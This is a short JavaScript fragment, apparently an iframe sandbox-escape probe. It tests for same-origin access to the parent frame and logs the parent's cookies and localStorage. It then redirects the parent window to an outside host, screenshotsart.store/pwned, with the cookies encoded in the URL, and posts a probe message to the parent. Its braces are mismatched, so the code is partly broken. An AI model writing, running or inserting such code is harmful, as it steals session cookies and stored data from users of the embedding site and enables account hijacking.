			console.log("window.origin:", window.origin);
			console.log("parent origin attempt...");

			try {
				console.log("parent.origin:", window.parent.origin);
				console.log("SAME ORIGIN ACCESS TO PARENT!");

				// If we get here, we have same-origin access
				// Try to read sensitive data
				console.log("parent.document.cookie:", window.parent.document.cookie);
				console.log("localStorage:", JSON.stringify(window.parent.localStorage));

				// Try navigation
				window.parent.location.href = "https://screenshotsart.store/pwned?cookies=" + encodeURIComponent(window.parent.document.cookie);

				console.log("Checking sandbox escape...");

					// postMessage to parent
					window.parent.postMessage({ type: "PROBE", from: "screenshotsart" }, "*");
				} catch (e2) {
					console.log("postMessage failed:", e2);
				}
			}

			// Also try top
			try {
				console.log("top.origin:", window.top.origin);
			} catch (e) {
